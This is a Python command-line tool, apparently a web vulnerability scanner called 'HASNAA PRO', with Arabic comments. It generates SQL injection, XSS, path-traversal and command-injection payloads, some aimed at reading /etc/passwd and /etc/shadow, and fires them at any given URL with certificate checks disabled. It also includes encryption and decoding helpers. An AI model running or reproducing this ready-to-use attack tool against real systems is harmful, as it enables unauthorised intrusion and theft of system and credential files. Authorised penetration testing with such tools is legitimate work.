#!/usr/bin/env python3
"""
HASNAA PRO v6.0 – ملف واحد كامل
"""
import os, sys, base64, secrets, hashlib, threading, re, time, math, argparse, json
from collections import Counter
from datetime import datetime
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("تثبيت cryptography...")
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import requests
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

try:
    from bs4 import BeautifulSoup
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "beautifulsoup4"])
    from bs4 import BeautifulSoup

# ═══════════════════════════════════════════════
# التشفير
# ═══════════════════════════════════════════════
class SecureCipher:
    def __init__(self, key=None):
        self.key = key or secrets.token_bytes(32)
        self.aesgcm = AESGCM(self.key)
        self.lock = threading.Lock()
    def encrypt(self, plaintext, aad=b''):
        if isinstance(plaintext, str): plaintext = plaintext.encode('utf-8')
        nonce = secrets.token_bytes(12)
        with self.lock: ct = self.aesgcm.encrypt(nonce, plaintext, aad)
        return base64.b64encode(b'\x01' + nonce + ct).decode()
    def decrypt(self, ciphertext_b64, aad=b''):
        try:
            raw = base64.b64decode(ciphertext_b64)
            if len(raw) < 13: return None
            _, nonce, ct = raw[0], raw[1:13], raw[13:]
            with self.lock: return self.aesgcm.decrypt(nonce, ct, aad)
        except: return None

class KeyManager:
    def __init__(self):
        key_file = os.path.join(os.path.expanduser('~'), '.hasnaa_key')
        if os.path.exists(key_file):
            with open(key_file, 'r') as f: self.master_key = base64.b64decode(f.read().strip())
        else:
            self.master_key = secrets.token_bytes(32)
            with open(key_file, 'w') as f: f.write(base64.b64encode(self.master_key).decode())
            os.chmod(key_file, 0o600)
    def get_master_key(self): return self.master_key

# ═══════════════════════════════════════════════
# مولد الحمولات
# ═══════════════════════════════════════════════
def gen_sql(n=500):
    payloads = []
    for q in ["'", '"']:
        for s in ['--', '#']: payloads.append(f"{q} OR 1=1 {s}")
    for c in range(1, 11): payloads.append(f"' UNION SELECT {','.join(['NULL']*c)}--")
    for d in [1,2,3,4,5]: payloads.append(f"' AND SLEEP({d})--")
    return list(set(payloads))[:n]

def gen_xss(n=200):
    base = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
    return [base[i%3].replace('alert(1)', f'alert({i})') for i in range(n)]

def gen_lfi(n=100):
    payloads = []
    for f in ['/etc/passwd', '/etc/shadow', '/etc/hosts']:
        for d in range(1, 11): payloads.append(('../'*d) + f[1:])
    return payloads[:n]

def gen_cmdi(n=50):
    payloads = []
    for cmd in ['whoami', 'id', 'uname -a', 'cat /etc/passwd']:
        payloads.extend([f'; {cmd}', f'| {cmd}', f'`{cmd}`', f'$({cmd})'])
    return payloads[:n]

# ═══════════════════════════════════════════════
# الماسح الأساسي
# ═══════════════════════════════════════════════
class BasicScanner:
    def __init__(self, url, threads=20):
        self.url = url
        self.threads = threads
        self.findings = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def _check_sql(self, html, payload, elapsed):
        errors = ['sql syntax', 'mysql_fetch', 'unclosed quotation', 'error in your sql']
        if any(e in html.lower() for e in errors): return True, 'Error-based SQLi'
        if 'sleep' in payload.lower() and elapsed > 1: return True, 'Time-based SQLi'
        return False, ''

    def _check_xss(self, html, payload, elapsed):
        clean = payload.split('//')[0] if '//' in payload else payload
        return (clean and clean in html, 'Reflected XSS')

    def _check_lfi(self, html, payload, elapsed):
        return (any(k in html for k in ['root:x:', 'www-data:', '/bin/bash']), 'LFI')

    def _check_cmdi(self, html, payload, elapsed):
        return (any(k in html for k in ['uid=', 'gid=', 'root:', 'www-data']), 'CMDi')

    def _test(self, payload, check_func, vuln_type):
        try:
            full_url = self.url.replace('FUZZ', payload)
            start = time.time()
            r = self.session.get(full_url, timeout=10)
            elapsed = time.time() - start
            is_vuln, desc = check_func(r.text, payload, elapsed)
            if is_vuln:
                with self.lock:
                    self.findings.append({'type': vuln_type, 'payload': payload[:100], 'desc': desc, 'url': full_url})
                    print(f"  [!] {vuln_type}: {payload[:60]} ({desc})")
        except: pass

    def _run(self, payloads, check_func, vuln_type):
        print(f"\n🔍 فحص {vuln_type} ({len(payloads)} حمولة)...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(lambda p: self._test(p, check_func, vuln_type), payloads)

    def scan_all(self):
        print(f"\n🚀 بدء الفحص: {self.url}")
        self._run(gen_sql(), self._check_sql, 'SQLi')
        self._run(gen_xss(), self._check_xss, 'XSS')
        self._run(gen_lfi(), self._check_lfi, 'LFI')
        self._run(gen_cmdi(), self._check_cmdi, 'CMDi')
        print(f"\n✅ تم اكتشاف {len(self.findings)} ثغرة")
        return self.findings

# ═══════════════════════════════════════════════
# أدوات مساعدة
# ═══════════════════════════════════════════════
class Decoder:
    @staticmethod
    def encode(text, t):
        m = {'base64': lambda x: base64.b64encode(x.encode()).decode(),
             'url': lambda x: quote(x), 'hex': lambda x: x.encode().hex(),
             'md5': lambda x: hashlib.md5(x.encode()).hexdigest(),
             'sha256': lambda x: hashlib.sha256(x.encode()).hexdigest()}
        return m.get(t, lambda x: x)(text)
    @staticmethod
    def decode(text, t):
        m = {'base64': lambda x: base64.b64decode(x.encode()).decode(errors='replace'),
             'url': lambda x: unquote(x), 'hex': lambda x: bytes.fromhex(x).decode(errors='replace')}
        return m.get(t, lambda x: x)(text)

class Sequencer:
    def __init__(self, tokens=None): self.tokens = tokens or []
    def analyze(self):
        if not self.tokens: return {'error': 'No tokens'}
        chars = ''.join(self.tokens)
        counts = Counter(chars)
        total = len(chars)
        entropy = -sum((c/total)*math.log2(c/total) for c in counts.values() if c>0)
        return {'entropy': round(entropy,4), 'unique': len(counts), 'total': total}

# ═══════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(description='HASNAA PRO v6.0')
    sub = parser.add_subparsers(dest='cmd', required=True)

    scan = sub.add_parser('scan')
    scan.add_argument('--url', required=True)
    scan.add_argument('--type', choices=['sql','xss','lfi','cmdi','all'], default='all')
    scan.add_argument('--threads', type=int, default=20)

    enc = sub.add_parser('encrypt'); enc.add_argument('--text', required=True)
    dec = sub.add_parser('decrypt'); dec.add_argument('--text', required=True)
    codec = sub.add_parser('decode'); codec.add_argument('--text', required=True); codec.add_argument('--type', choices=['base64','url','hex'], required=True)
    seq = sub.add_parser('sequencer'); seq.add_argument('--tokens', nargs='+', required=True)
    ver = sub.add_parser('version')

    args = parser.parse_args()

    if args.cmd == 'scan':
        BasicScanner(args.url, args.threads).scan_all()
    elif args.cmd == 'encrypt':
        km = KeyManager()
        print(SecureCipher(km.get_master_key()).encrypt(args.text))
    elif args.cmd == 'decrypt':
        km = KeyManager()
        r = SecureCipher(km.get_master_key()).decrypt(args.text)
        print(r.decode() if r else "❌ فشل")
    elif args.cmd == 'decode':
        print(Decoder.decode(args.text, args.type))
    elif args.cmd == 'sequencer':
        print(Sequencer(args.tokens).analyze())
    elif args.cmd == 'version':
        print("HASNAA PRO v6.0")

if __name__ == '__main__':
    main()
